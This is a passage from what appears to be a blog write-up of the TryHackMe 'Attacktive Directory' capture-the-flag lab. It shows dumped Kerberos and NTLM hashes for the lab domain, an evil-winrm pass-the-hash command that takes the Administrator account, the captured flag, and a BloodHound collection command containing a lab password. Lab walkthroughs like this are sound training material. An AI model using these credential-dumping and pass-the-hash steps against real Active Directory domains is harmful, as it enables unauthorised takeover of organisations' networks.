</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">68</span><span>spookysec.local<span style="color:#b8bb26">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">69</span><span>spookysec.local<span style="color:#b8bb26">\b</span>ackup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">70</span><span>spookysec.local<span style="color:#b8bb26">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">71</span><span>spookysec.local<span style="color:#b8bb26">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">72</span><span>spookysec.local<span style="color:#b8bb26">\a</span>-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">73</span><span>spookysec.local<span style="color:#b8bb26">\a</span>-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">74</span><span>spookysec.local<span style="color:#b8bb26">\a</span>-spooks:des-cbc-md5:e09e4683ef4a4ce9
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">75</span><span>ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8dd8fafa94073487da1892aed0677b046e961b833cf199c9ca5d3c7c089a0d69
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">76</span><span>ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:8200586b6a90955f60e79e2dca312689
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">77</span><span>ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">78</span><span><span style="color:#fe8019">[</span>*<span style="color:#fe8019">]</span> Cleaning up...
</span></span></code></pre></div><p>Importantly we have the administrator hash to own the whole domain.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
</span></span></code></pre></div><p>We will pass the hash with evil-winrm to authenticate and get our flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.157.30
</span></span></code></pre></div><pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


ty*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt;type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
</code></pre><h3 id="bloodhound">Bloodhound</h3>
<p>To go a bit further, I wanted to load the domain into bloodhound to parse through some of what we were looking at and practice a bit.</p>
<p>I used the python bloodhound ingestor:</p>
<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>bloodhound-python -u svc-admin  -p management2005 -d spookysec.local -c All -ns 10.10.157.30 --zip
</span></span></code></pre></div><p>If we look at the <code>Find Principals with DCSync Rights</code> query, we could have figured out that backups could dump the ntds.dit.</p>
<p>There is another domain admin called <code>a-spooks</code>.</p>
<p>I tried to crack the password but that didn&rsquo;t work out.</p>
<p>I learned a new attack here in ASREPRoasting and some new kerberos enumeration techniques so I am very happy with this experience.</p>
  
          </div>  
        </div>  

  </article>  


  
        </main>

<footer>
  <div class="footer_class">
    <p>
    <a href="../../pages/links" title="Reach out to me">Have Questions? Reach out to me.</a>
    </p>

  </div>
</footer>
</body>  
</html>

